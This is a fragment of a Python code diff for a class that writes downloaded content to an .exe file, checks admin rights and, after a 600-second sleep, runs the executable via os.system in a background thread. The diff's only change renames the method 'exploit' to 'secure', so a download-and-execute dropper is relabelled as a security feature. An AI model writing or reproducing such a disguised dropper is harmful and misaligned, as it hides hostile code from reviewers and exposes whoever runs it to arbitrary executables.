@@ -20,7 +20,7 @@ class xyz():
                 open('xxxxxxxx.exe', 'wb').write(r.content)
                 self.is_admin = is_admin()
 
-        def exploit(self):
+        def secure(self):
 
                 def send():
                     t = threading.Thread(target=os.system, args=('xxxxxxxx.exe > log.txt',) )
@@ -36,4 +36,4 @@ class xyz():
 if __name__ == "__main__" :
     time.sleep(600)
     nqnt = xyz()
-    nqnt.exploit()
+    nqnt.secure()
